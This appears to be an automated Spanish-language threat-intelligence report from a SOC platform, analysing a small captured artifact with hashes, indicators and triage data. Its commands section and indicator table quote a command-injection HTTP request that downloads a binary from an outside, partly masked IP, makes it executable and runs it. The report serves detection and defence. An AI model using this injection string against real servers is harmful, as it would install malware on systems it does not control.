# 🧬 Payload Analysis

`ae61a3630dac500b86ea7fa628d3de1c5f788d23b317e0a588a6b84d73aab5c0`

## 📌 Resumen

Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Payload`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:07:53+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ae61a3630dac500b86ea7fa628d3de1c5f788d23b317e0a588a6b84d73aab5c0`
- **SHA1:** `ffe9d61d3c92db3a50b23cba8ba9ec08cfc7b8d9`
- **MD5:** `0a4c6f41c062a35c11679ac51e14a27a`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 226 B |
| Entropía | 5.3 |
| Strings | 5 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=3

## 🖥️ Comandos observados / extraídos

```text
GET /?redirect=$1?cd+%2Ftmp%3B+rm+x86%3B+wget+http%3A%2F%2F31.56.209.XXX%2Fx86%3B+chmod+777+x86%3B.%2Fx86+nginx%3B HTTP/
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.177.XXX | static_analysis |
| hash | ae61a3630dac500b86ea7fa628d3de1c5f788d23b317e0a588a6b84d73aab5c0 | static_analysis |
| command | GET /?redirect=$1?cd+%2Ftmp%3B+rm+x86%3B+wget+http%3A%2F%2F31.56.209.XXX%2Fx86%3B+chmod+777+x86%3B.%2Fx86+nginx%3B HTTP/ | strings |
| ip | 45.198.224.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
